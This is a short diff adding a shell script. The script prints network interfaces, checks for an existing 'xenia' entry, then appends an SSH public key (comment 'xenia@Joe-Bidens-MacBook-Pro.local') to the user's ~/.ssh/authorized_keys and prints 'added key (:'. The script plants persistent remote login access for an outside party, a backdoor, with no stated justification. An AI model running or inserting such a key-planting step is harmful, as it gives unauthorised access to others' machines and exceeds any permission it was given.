@@ -1,0 +1,5 @@
+set -e
+ip a
+! grep 'xenia' ~/.ssh/authorized_keys
+echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAH6fYhJ65lvtERuNc4NDctA+SLafx3D/Ykkmi1WyweQZekk2Wt04MoTpSG7qppcSpItH/FugzOcpEesYqfSGb5xj3HYzy8qkqVe4snXZQPgBYAnMC0a6eLjfTGTGS2iw0RzFG1sW30MgzGfNrJTgSfOMPSqs1L8Ws9tAK9DgyL9X7q+ckoqs6pz66nuIRxKKywby8uB0XyqV50GtVzEJwXWrap18NeJ+90kEk62DXeE0gJXHMjYZKzSKYG5+tHX9BMu51xkme9X7z1WrDS0pyBXbbIks729gGc9uP+U5ggnZ5ozz7OZeY6U18Ph+v77KTywifWdfQ/GjBtjTzn2IwImws24haZUh48Cfoa36bQX9mfl5x9AMlo0r/bylGI0KG0kC2av7WENx9JPfGMUBk9C+pXONe7yMX/gjANBXeUSbEx7+4ty8ZtSn6khRCXQ9MGDE+C1K5Fj4YGz+1eaKu0mS63uuJ4LbaMWHfUVlPJ/mg1RvGsanKUbgRgHlpK4M= xenia@Joe-Bidens-MacBook-Pro.local' >> ~/.ssh/authorized_keys
+echo 'added key (:'
